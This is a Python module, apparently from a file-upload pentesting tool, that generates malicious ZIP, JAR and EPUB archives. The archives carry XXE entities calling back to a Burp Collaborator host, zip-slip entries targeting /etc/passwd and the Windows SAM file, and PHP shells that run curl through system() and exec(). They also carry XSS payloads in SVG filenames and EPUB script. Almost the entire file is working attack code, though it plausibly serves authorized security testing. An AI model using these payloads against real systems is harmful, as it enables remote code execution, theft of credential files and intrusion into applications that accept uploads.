from pathlib import Path
import zipfile
import tempfile

try:
    from .ssti_filename_generator import generate_ssti_filename_payloads
    from .xss_filename_generator import generate_xss_filename_payloads
except ImportError:
    try:
        from ssti_filename_generator import generate_ssti_filename_payloads
        from xss_filename_generator import generate_xss_filename_payloads
    except ImportError:
        generate_ssti_filename_payloads = None
        generate_xss_filename_payloads = None

def generate_archive_payloads(output_dir, ext, burp_collab, tech_filter='all', payload_types=None):
    if payload_types is None:
        payload_types = {'all'}
    
    def should_generate_type(payload_type):
        return 'all' in payload_types or payload_type in payload_types
    output_dir = Path(output_dir)
    base_url = f"http://{burp_collab}"
    
    if ext in ['zip', 'jar', 'epub']:
        output_dir.mkdir(parents=True, exist_ok=True)
        
        if should_generate_type('xxe'):
            xxe_dir = output_dir / 'xxe'
            xxe_dir.mkdir(exist_ok=True)
        if should_generate_type('path_traversal'):
            path_traversal_dir = output_dir / 'path_traversal'
            path_traversal_dir.mkdir(exist_ok=True)
        if should_generate_type('rce') or should_generate_type('deserialization'):
            rce_dir = output_dir / 'rce'
            rce_dir.mkdir(exist_ok=True)
        if should_generate_type('xss'):
            xss_dir = output_dir / 'xss'
            xss_dir.mkdir(exist_ok=True)
        
        xml_content_xxe1 = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{base_url}/xxe-{ext}-1">
]>
<root>
<data>&xxe;</data>
</root>'''
        
        if should_generate_type('xxe'):
            output_file = xxe_dir / f"xxe1_doctype.{ext}"
            with tempfile.TemporaryDirectory() as temp_dir:
                temp_path = Path(temp_dir)
                xml_file = temp_path / "test.xml"
                xml_file.write_text(xml_content_xxe1)
                
                with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                    zip_ref.write(xml_file, 'test.xml')
            
            xml_content_xxe2 = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "{base_url}/xxe-{ext}-2">
%xxe;
]>
<root>
<data>test</data>
</root>'''
            
            output_file = xxe_dir / f"xxe2_parameter.{ext}"
            with tempfile.TemporaryDirectory() as temp_dir:
                temp_path = Path(temp_dir)
                xml_file = temp_path / "test.xml"
                xml_file.write_text(xml_content_xxe2)
                
                with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                    zip_ref.write(xml_file, 'test.xml')
        
        if should_generate_type('path_traversal'):
            output_file = path_traversal_dir / f"path1_relative.{ext}"
            with tempfile.TemporaryDirectory() as temp_dir:
                temp_path = Path(temp_dir)
                test_file = temp_path / "test.txt"
                test_file.write_text("test")
                
                with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                    zip_ref.write(test_file, "../../../etc/passwd")
            
            output_file = path_traversal_dir / f"path2_windows.{ext}"
            with tempfile.TemporaryDirectory() as temp_dir:
                temp_path = Path(temp_dir)
                test_file = temp_path / "test.txt"
                test_file.write_text("test")
                
                with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                    zip_ref.write(test_file, "..\\..\\..\\windows\\system32\\config\\sam")
        
        if (should_generate_type('rce') or should_generate_type('deserialization')) and ext in ['zip', 'jar']:
            php_content_rce1 = f"<?php system('curl {base_url}/rce-{ext}-system'); ?>"
            output_file = rce_dir / f"rce1_php_system.{ext}"
            with tempfile.TemporaryDirectory() as temp_dir:
                temp_path = Path(temp_dir)
                php_file = temp_path / "shell.php"
                php_file.write_text(php_content_rce1)
                
                with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                    zip_ref.write(php_file, 'shell.php')
            
            php_content_rce2 = f"<?php exec('curl {base_url}/rce-{ext}-exec'); ?>"
            output_file = rce_dir / f"rce2_php_exec.{ext}"
            with tempfile.TemporaryDirectory() as temp_dir:
                temp_path = Path(temp_dir)
                php_file = temp_path / "shell.php"
                php_file.write_text(php_content_rce2)
                
                with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                    zip_ref.write(php_file, 'shell.php')
        
        if should_generate_type('xss'):
            if ext == 'zip':
                svg_content = '<svg onload=alert(1) xmlns="http://www.w3.org/2000/svg" width="100" height="100"><rect width="100" height="100" fill="red"/></svg>'
                output_file = xss_dir / f"xss1_filename.{ext}"
                with tempfile.TemporaryDirectory() as temp_dir:
                    temp_path = Path(temp_dir)
                    svg_file = temp_path / "<svg onload=alert(1)>.svg"
                    svg_file.write_text(svg_content)
                    
                    with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                        zip_ref.write(svg_file, '<svg onload=alert(1)>.svg')
            
            if ext == 'epub':
                xhtml_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>Test</title>
</head>
<body>
<script>alert(1)</script>
</body>
</html>'''
                output_file = xss_dir / f"xss1_script.{ext}"
                with tempfile.TemporaryDirectory() as temp_dir:
                    temp_path = Path(temp_dir)
                    (temp_path / "META-INF").mkdir()
                    (temp_path / "META-INF" / "container.xml").write_text('<?xml version="1.0"?><container><rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles></container>')
                    (temp_path / "OEBPS").mkdir()
                    (temp_path / "OEBPS" / "content.opf").write_text('<?xml version="1.0"?><package xmlns="http://www.idpf.org/2007/opf" version="2.0"><metadata><dc:title xmlns:dc="http://purl.org/dc/elements/1.1/">Test</dc:title></metadata><manifest><item id="chapter1" href="chapter1.xhtml" media-type="application/xhtml+xml"/></manifest><spine><itemref idref="chapter1"/></spine></package>')
                    (temp_path / "OEBPS" / "chapter1.xhtml").write_text(xhtml_content)
                    
                    with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                        for file_path in temp_path.rglob('*'):
                            if file_path.is_file():
                                arcname = file_path.relative_to(temp_dir)
                                zip_ref.write(file_path, arcname)
        
        master_file = output_dir / f"master.{ext}"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            xml_file = temp_path / "test.xml"
            xml_file.write_text(xml_content_xxe1)
            
            test_file = temp_path / "test.txt"
            test_file.write_text("test")
            
            with zipfile.ZipFile(master_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                zip_ref.write(xml_file, 'test.xml')
                if ext in ['zip', 'jar'] and (should_generate_type('rce') or should_generate_type('deserialization')):
                    php_content_rce1 = f"<?php system('curl {base_url}/rce-{ext}-system'); ?>"
                    php_file = temp_path / "shell.php"
                    php_file.write_text(php_content_rce1)
                    zip_ref.write(php_file, 'shell.php')
        
        if generate_ssti_filename_payloads and should_generate_type('ssti'):
            generate_ssti_filename_payloads(output_dir, ext, burp_collab, tech_filter)
        
        if generate_xss_filename_payloads and should_generate_type('xss'):
            generate_xss_filename_payloads(output_dir, ext, burp_collab, tech_filter)
